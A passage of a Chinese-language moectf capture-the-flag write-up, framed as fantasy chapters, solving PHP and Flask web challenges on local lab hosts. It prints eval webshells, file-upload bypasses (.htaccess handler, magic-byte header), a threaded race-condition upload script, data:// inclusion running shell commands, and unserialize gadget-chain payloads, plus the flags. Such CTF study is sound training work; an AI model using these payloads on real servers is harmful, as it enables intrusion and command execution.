class="language-none">&#x2F;find.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre><p>用<code>base64</code>解码，<code>flag</code>在<code>php</code>代码注释里。</p><pre class="language-none"><code class="language-none">moectf&#123;84fd1e75-647c-3aa4-82b8-1cba2dc45347&#125;</code></pre><h2 id="第十二章-玉魄玄关破妄">12 第十二章 玉魄玄关·破妄</h2><blockquote><p><strong>「吾乃玉魄初主玄微子。后世得见吾之传承者，需破四玄关。」</strong><strong>「首关‘破妄’——勘破虚妄，直抵本真。」</strong></p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>用蚁剑连接，根目录打开终端输入<code>env</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;ff560111-86ab-ec12-dee6-084f8d577fb5&#125;</code></pre><h2 id="第十三章-通幽关灵纹诡影">13 第十三章 通幽关·灵纹诡影</h2><blockquote><p><strong>「此关禁绝残魂」</strong>玄微子的声音从齿轮深处传来，<strong>「魔气擅噬神魂，汝需独力破局」</strong><strong>「任务：」</strong> <strong>【清秽】净化玉魄核心</strong><strong>【绘真】上传修复灵纹</strong></p></blockquote><p>题目已经提示了文件头绕过<code>FFD8FF</code>。</p><p>构造一句话木马<code>1.php</code>，并用<code>01editor</code>修改文件头。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>上传后用蚁剑连接<code>http://127.0.0.1:53111/uploads/1.php</code>，根目录打开终端输入<code>env</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;63f59f3f-1a5e-fa6a-782d-58a02b7b3440&#125;</code></pre><h2 id="第十四章-御神关补天玉碑">14 第十四章 御神关·补天玉碑</h2><blockquote><p><strong>御神关任务：</strong> <strong>【补天】修复守护玉碑</strong><strong>【斩魔】激活玉碑镇压魔心</strong></p></blockquote><p>系统过滤<code>php</code>文件，提示是<code>apache</code>服务器，我们可以伪装成配置文件<code>.htaccess</code>。</p><pre class="language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;Files &quot;payload&quot;&gt;    SetHandler application&#x2F;x-httpd-php&lt;&#x2F;Files&gt;</code></pre><p>这个文件会把<code>payload</code>文件作为<code>php</code>文件执行。上传一句话木马，文件名为<code>payload</code>，不需要后缀。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>用蚁剑连接<code></code>，检查根目录文件发现<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;e85c55a3-1c51-b895-1129-cf7737bca98a&#125;</code></pre><p><strong>还可以关注一下<code>.user.ini</code>以及图片马的用法。</strong></p><h2 id="第十五章-归真关竞时净魔">15 第十五章 归真关·竞时净魔</h2><blockquote><p><strong>「魔心秽血已污染玉魄九成…归真关乃最后机缘…若败…万物皆灭…」</strong></p></blockquote><p><a href="https://blog.csdn.net/qq_46150940/article/details/115639419">浅析条件竞争漏洞_竞争条件漏洞-CSDN博客</a></p><p>文件上传弄了好久，还是注意审题，应该是条件竞争。<code>bp</code>不装插件不能多线程，所以我们用<code>py</code>。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutorupload_url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:23722/"</span>shell_url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:23722/uploads/shell.php"</span><span class="token keyword">def</span> <span class="token function">race_condition_attack</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"upload_file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>            <span class="token string">"shell.php"</span><span class="token punctuation">,</span>              <span class="token string">"&lt;?php fputs(fopen('pass.php','w'),'&lt;?php phpinfo();?>');?>"</span><span class="token punctuation">,</span>          <span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"上传"</span><span class="token punctuation">&#125;</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>upload_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 上传成功！Shell 已存在:"</span><span class="token punctuation">,</span> shell_url<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pool<span class="token punctuation">:</span>        pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>race_condition_attack<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  </code></pre><pre class="language-none"><code class="language-none">moectf&#123;70c57075-0bc1-245e-03cc-3f77007a2b06&#125;</code></pre><h2 id="第十六章-昆仑星途">16 第十六章 昆仑星途</h2><blockquote><p>玄天剑宗的庆功宴设在破碎天穹之下。葬星古墟的悬棺第一次不再是死亡的象征，而是化作漫天星灯，守玉人静立虚空，以身为烛，照亮这场跨越生死的盛宴。</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>传递<code>file参数</code>会在前端展示内容，需要绕过<code>.php</code>，发现<code>allow_url_include = On</code>，<code>flag</code>文件名为随机30个数字字母（<code>flag-xxxx</code>）。我们利用文件包含原理，并用<code>#</code>注释掉URL中后续的参数以绕过检测。</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:65009&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat &#x2F;flag-*&#39;);?&gt;# </code></pre><pre class="language-none"><code class="language-none">moectf&#123;3b6a1b51-3a4a-559b-4452-0cba9e8f1bd5&#125;</code></pre><h2 id="第十七章-星骸迷阵神念重构">17 第十七章 星骸迷阵·神念重构</h2><blockquote><p>脚下并非实地，而是悬浮的青铜齿轮，大的如山脉横亘，小的似微尘浮游。齿轮咬合处迸发着数据流光，在虚空中交织成无尽迴路。远处有破碎的殿宇倒悬，廊柱间缠绕着发光藤蔓——细看竟是具象化的代码流！</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:54364&#x2F;?a&#x3D;O:1:%22A%22:1:&#123;s:1:%22a%22;s:10:%22phpinfo();%22;&#125;</code></pre><p>在<code>phpinfo()</code>的<code>env</code>里找到了<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;cc0c2fc5-8ec3-ed9b-2741-e826d5207b5f&#125;</code></pre><h2 id="第十八章-万卷诡阁功法连环">18 第十八章 万卷诡阁·功法连环</h2><blockquote><p>黑猫挥出的数据风暴将三人卷入一座无尽书阁。檀木书架高耸入云，其上玉简如星河铺展，每一卷都流淌着大道符文。阁中央悬浮着墨玉棋局，三百六十一枚棋子皆由压缩的功法代码凝成。</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonA</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonB</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:54605&#x2F;?person&#x3D;O:7:&quot;PersonA&quot;:1:&#123;s:13:&quot;%00PersonA%00name&quot;;O:7:&quot;PersonB&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</code></pre><p>在<code>phpinfo()</code>的<code>env</code>里找到了<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;77f0400b-f11a-812b-e1a4-78d0f2627b5d&#125;</code></pre><h2 id="第十九章-星穹真相补天归源">19 第十九章 星穹真相·补天归源</h2><blockquote><p>空间裂缝闭合的刹那，三人坠入一片混沌星穹。这里没有天地之分，只有无数破碎的镜面悬浮流转，每一面镜子都映照出不同的时空片段——有玄天剑宗的庆功宴，有葬星古墟的惨战，甚至还有HDdss幼时在赵家偏院练剑的青涩模样。</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonA</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token variable">$id</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonB</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonC</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__Check</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$person</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:65309&#x2F;?person&#x3D;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:2:&quot;id&quot;;s:2:&quot;xx&quot;;s:3:&quot;age&quot;;s:2:&quot;xx&quot;;&#125;s:2:&quot;id&quot;;s:7:&quot;__Check&quot;;s:3:&quot;age&quot;;s:7:&quot;cat &#x2F;f*&quot;;&#125;</code></pre><pre class="language-none"><code class="language-none">moectf&#123;b9c0db89-853c-52fd-c779-ffe5bc66a127&#125;</code></pre><h2 id="第十九章_revenge">19 第十九章_revenge</h2><blockquote><p>第十九章的revenge</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonA</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token variable">$id</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonB</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PersonC</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$age</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Age can't be empty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$person</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:56672&#x2F;?person&#x3D;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;exec&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonB&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;any&quot;;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;N;&#125;s:3:&quot;age&quot;;N;&#125;s:3:&quot;age&quot;;s:3:&quot;xxx&quot;;&#125;s:2:&quot;id&quot;;s:5:&quot;check&quot;;s:3:&quot;age&quot;;s:3:&quot;env&quot;;&#125;</code></pre><pre class="language-none"><code class="language-none">moectf&#123;de439502-db1f-64b9-f661-a7900923048e&#125;</code></pre><h2 id="第二十章-幽冥血海幻语心魔">20 第二十章 幽冥血海·幻语心魔</h2><blockquote><p>断笛中爆出血雾，在空中交织成诡异符阵。另外两名魔修同时喷出本命精血，嘶声吟唱：</p><p>“以血为媒，以言为咒——幻语心魔阵，启！”</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args <span class="token keyword">or</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>            login_msg <span class="token operator">=</span> <span class="token triple-quoted-string string">"""            &lt;div class="login-result" id="result">                &lt;div class="result-title">阵法反馈&lt;/div>                &lt;div id="result-content">&lt;div class='login-fail'>用户名或密码不能为空&lt;/div>&lt;/div>            &lt;/div>            """</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            login_msg <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"""            &lt;div class="login-result" id="result">                &lt;div class="result-title">阵法反馈&lt;/div>                &lt;div id="result-content">&lt;div class='login-success'>欢迎: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/div>&lt;/div>            &lt;/div>            """</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        login_msg <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> login_msg<span class="token operator">=</span>login_msg<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token 